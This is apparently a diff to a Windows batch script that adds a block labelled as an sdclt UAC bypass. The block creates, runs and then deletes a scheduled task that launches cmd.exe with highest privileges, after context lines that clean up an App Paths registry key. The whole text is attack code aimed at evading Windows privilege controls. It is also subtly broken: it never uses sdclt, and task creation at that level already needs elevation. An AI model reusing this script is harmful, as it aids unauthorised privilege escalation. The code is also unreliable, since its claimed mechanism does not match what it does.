@@ -60,3 +60,23 @@ timeout /t 3 /nobreak >nul
 
 REM Cleanup the registry
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
+
+-----------------------------------------------------------
+
+@echo off
+
+setlocal
+set "taskname=SdcltUACBypass"
+set "program=C:\Windows\System32\cmd.exe"
+
+REM Create a scheduled task to run the program with highest privileges
+schtasks /create /tn "%taskname%" /tr "%program%" /rl highest /f /sc onlogon
+
+REM Run the scheduled task
+schtasks /run /tn "%taskname%"
+
+REM Optional: Cleanup the scheduled task after execution
+timeout /t 3 /nobreak >nul
+schtasks /delete /tn "%taskname%" /f
+
+endlocal
